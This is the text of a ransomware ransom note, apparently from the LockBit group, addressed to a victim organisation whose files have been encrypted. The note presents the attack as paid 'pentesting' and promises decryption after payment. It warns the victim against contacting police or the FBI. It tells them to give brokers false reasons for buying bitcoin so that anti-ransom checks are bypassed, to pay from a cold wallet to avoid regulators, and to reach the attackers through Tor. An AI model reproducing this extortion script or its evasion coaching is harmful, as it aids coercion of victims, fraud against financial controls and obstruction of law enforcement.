We are not a politically motivated group and want nothing but financial rewards for our work. If we defraud even one client, other clients will not pay us. In 5 years, not a single client has been left dissatisfied after making a deal with us. If you pay the ransom, we will fulfill all the terms we agreed upon during the negotiation process. Treat this situation simply as a paid training session for your system administrators, because it was the misconfiguration of your corporate network that allowed us to attack you. Our pentesting services should be paid for the same way you pay your system administrators' salaries. You can get more information about us on Elon Musk's Twitter at https:\/\/twitter.com\/hashtag\/lockbit?f=live.\n\n>>>>> Warning! Do not delete or modify encrypted files, it will lead to irreversible problems with decryption of files!\n\n>>>>> Don't go to the police or the FBI for help and don't tell anyone that we attacked you. They will forbid you from paying the ransom and will not help you in any way, you will be left with encrypted files and your business will die.\n\n>>>>> When buying bitcoin, do not tell anyone the true purpose of the purchase. Some brokers, especially in the US, do not allow you to buy bitcoin to pay ransom. Communicate any other reason for the purchase, such as: personal investment in cryptocurrency, bitcoin as a gift, paying to buy assets for your business using bitcoin, cryptocurrency payment for consulting services, cryptocurrency payment for any other services, cryptocurrency donations, cryptocurrency donations for Donald Trump to win the election, buying bitcoin to participate in ICO and buy other cryptocurrencies, buying cryptocurrencies to leave an inheritance for your children, or any other purpose for buying cryptocurrency. Also you can use adequate cryptocurrency brokers who do not ask questions for what you buy cryptocurrency.\n\n>>>>> After buying cryptocurrency from a broker, store the cryptocurrency on a cold wallet, such as https:\/\/electrum.org\/ or any other cold cryptocurrency wallet, more details on https:\/\/bitcoin.org By paying the ransom from your personal cold cryptocurrency wallet, you will avoid any problems from regulators, police and brokers.\n\n>>>>> Don't be afraid of any legal consequences, you were very scared, that's why you followed all our instructions, it's not your fault if you are very scared. Not a single company that paid us has had issues. Any excuses are just for insurance company to not pay on their obligation.\n\n>>>>> You need to contact us via TOR darknet sites with your personal ID\n\nDownload and install Tor Browser https:\/\/www.torproject.org\/\nWrite to the chat room and wait for an answer, we'll guarantee a response from us. If you need a unique ID for correspondence with us that no one will know about, ask it in the chat, we will generate a secret chat for you and give you ID via private one-time memos service, no one can find out this ID but you.
